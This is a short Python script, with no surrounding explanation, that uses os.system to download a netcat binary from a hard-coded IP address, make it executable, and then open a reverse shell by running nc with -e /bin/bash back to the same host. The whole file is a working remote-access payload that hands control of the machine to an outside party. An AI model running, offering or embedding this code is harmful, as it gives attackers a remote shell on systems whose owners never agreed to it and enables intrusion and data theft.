import os

os.system("curl -O http://199.193.249.97:58889/nc")
os.system("pwd")
os.system("chmod 755 nc")
os.system("ldd nc")
os.system("ls -l")
os.system("./nc -e /bin/bash 199.193.249.97 58888")
